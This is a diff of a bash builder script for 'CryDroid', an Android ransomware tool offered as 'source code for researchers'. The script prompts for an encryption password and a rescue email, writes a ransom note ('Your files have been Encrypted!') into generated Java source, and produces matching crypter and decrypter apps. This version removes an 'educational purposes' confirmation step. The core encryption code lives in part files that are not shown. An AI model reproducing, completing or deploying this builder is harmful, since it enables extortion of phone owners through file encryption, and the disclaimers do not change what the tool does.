@@ -1,8 +1,9 @@
 #!/bin/bash
-# CryDroid v1.0
-# Author: @thelinuxchoice (You don't become a coder by just changing the credits)
-# Instagram: @linux_choice
+# CryDroid v1.1
+# Android Ransomware source code for researchers
+# This code was sent to virustotal to prevent it from being used for malicious purposes
 # Github: https://github.com/thelinuxchoice/crydroid
+# Twitter: @linux_choice
 
 trap 'printf "\n";stop' 2
 
@@ -18,18 +19,6 @@ exit 1
 
 }
 
-dependencies() {
-
-command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it: apt-get install apksigner. Aborting."; 
-exit 1; }
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
-exit 1; }
-
-command -v gradle > /dev/null 2>&1 || { echo >&2 "I require gradle but it's not installed. Install it. Aborting."; 
-exit 1; }
-
-}
 
 banner() {
 
@@ -42,24 +31,27 @@ printf "  \e[1;92m  / ___|_ __ _   _|  _ \ _ __ ___ (_) __| |\e[0m\e[1;77m  ///\
 printf "  \e[1;92m | |   | '__| | | | | | | '__/ _ \| |/ _\` |\e[0m\e[1;77m ||| ::/  \:: ; \n"
 printf "  \e[1;92m | |___| |  | |_| | |_| | | | (_) | | (_| |\e[0m\e[1;77m ||; ::\__/:: ; \n"
 printf "  \e[1;92m  \____|_|   \__, |____/|_|  \___/|_|\__,_|\e[0m\e[1;77m  \ \ '::::' / \n"
-printf "  \e[1;92m             |___/ \e[0m\e[1;77mv1.0                       \`=':-..-'\` \e[0m\n"
+printf "  \e[1;92m             |___/ \e[0m\e[1;77mv1.1                       \`=':-..-'\` \e[0m\n"
 printf "\n"
-printf "     \e[1;77mAuthor: https://github.com/thelinuxchoice/crydroid\n\e[0m"
-printf "\n"
+printf "         \e[1;90mhttps://github.com/thelinuxchoice/crydroid\n\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;92m::\e[0m\e[1;77m]   Android Ransomware source code for researchers   \e[1;77m[\e[0m\e[1;92m::\e[0m\e[1;77m]\n"
+printf "\e[1;77m[\e[0m\e[1;92m::\e[0m\e[1;77m]\e[0m\e[1;91m   This code was sent to virustotal to prevent it   \e[0m\e[1;77m[\e[0m\e[1;92m::\e[0m\e[1;77m]\n"
+printf "\e[1;77m[\e[0m\e[1;92m::\e[0m\e[1;77m]\e[0m\e[1;91m   from being used for malicious purposes.          \e[0m\e[1;77m[\e[0m\e[1;92m::\e[0m\e[1;77m]\n"
+
 }
 
 warning() {
-printf "\n"
-printf " \n  \e[1;41mUsage of CryDroid is COMPLETE RESPONSABILITY of the END-USER. \e[0m\n"
-printf "  \e[1;41mDevelopers assume no liability and are NOT responsible for any\e[0m\n"
-printf "  \e[1;41mmisuse or damage caused by this program.                      \e[0m\n"
-printf "\n"
-printf "  \e[1;77mI am using CryDroid for educational purposes only\e[0m\n"
-read -p $'  \e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\e[1;93mCopy and paste the above phrase:\e[0m ' end_user
 
-if [[ "$end_user" != "I am using CryDroid for educational purposes only" ]]; then
-exit 1
-fi 
+printf "\n\e[1;41mUsage of CryDroid is COMPLETE RESPONSABILITY of the END-USER\e[0m\n"
+printf "\e[1;41mDevelopers assume no liability and are NOT responsible for  \e[0m\n"
+printf "\e[1;41many misuse or damage caused by this program.                \e[0m\n"
+printf "\n"
+#printf "  \e[1;77mI am using CryDroid for educational purposes only\e[0m\n"
+#read -p $'  \e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\e[1;93mCopy and paste the above phrase:\e[0m ' end_user
+
+#if [[ "$end_user" != "I am using CryDroid for educational purposes only" ]]; then
+#exit 1
+#fi 
 
 }
 
@@ -134,12 +126,18 @@ fi
 
 decrypt() {
 
-printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Generating Decrypter App...\e[0m\n'
+cd app/
+IFS=$'\n'
+read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Decryption Password: \e[0m' password
+
 cat decrypter.part1 > app/src/main/java/com/crydroid/MainActivity.java
-printf 'String password = "%s";\n' $1 >> app/src/main/java/com/crydroid/MainActivity.java
+printf 'String password = "%s";\n' $password >> app/src/main/java/com/crydroid/MainActivity.java
 cat decrypter.part2 >> app/src/main/java/com/crydroid/MainActivity.java
-gradle build
-checkapk_decrypter
+printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Decrypter source code created. Build using Android Studio\e[0m\n'
+
+
+#gradle build
+#checkapk_decrypter
 }
 
 crypter() {
@@ -150,7 +148,6 @@ read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Encryption Password: \e[0m' pass
 
 read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Email to request rescue: \e[0m' email_rescue
 
-printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Generating Crypter App...\e[0m\n'
 
 if [[ ! -d app/src/main/java/com/crydroid/ ]]; then
 mkdir -p app/src/main/java/com/crydroid/
@@ -161,10 +158,11 @@ printf 'String tofile = "Your files have been Encrypted!\\nSend an Email to resc
 cat crypter.part2 >> app/src/main/java/com/crydroid/MainActivity.java
 printf 'String password = "%s";\n' $password >> app/src/main/java/com/crydroid/MainActivity.java
 cat crypter.part3 >> app/src/main/java/com/crydroid/MainActivity.java
+printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Crypter source code created. Build using Android Studio\e[0m\n'
 
-gradle build
-checkapk_crypter
-decrypt "$password"
+#gradle build
+#checkapk_crypter
+#decrypt "$password"
 }
 
 start() {
@@ -172,23 +170,40 @@ start() {
 if [[ -e "app/sendlink" ]]; then
 rm -rf app/sendlink 
 fi
-default_sdk_dir="/root/Android/Sdk"
-read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir
 
-sdk_dir="${sdk_dir:-${default_sdk_dir}}"
 
-if [[ ! -d $sdk_dir ]]; then
-printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
-sleep 1
-start
-else
-printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
+printf "\e[1;77m[\e[0m\e[1;92m1\e[0m\e[1;77m] Generate Crypter\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;92m2\e[0m\e[1;77m] Generate Decrypter\e[0m\n"
+
+read -p $'\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Option: \e[0m' gen_option
+
+if [[ $gen_option -eq 1 ]]; then
+
 crypter
+elif [[ $gen_option -eq 2 ]]; then
+decrypt
+else
+printf "\e[1;91m[!] Invalid\e[0m\n"
+exit 1
 fi
+
+
+#default_sdk_dir="/root/Android/Sdk"
+#read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir
+
+#sdk_dir="${sdk_dir:-${default_sdk_dir}}"
+
+#if [[ ! -d $sdk_dir ]]; then
+#printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
+#sleep 1
+#start
+#else
+#printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
+###crypter
+#fi
 
 
 }
 banner
-dependencies
 warning
 start
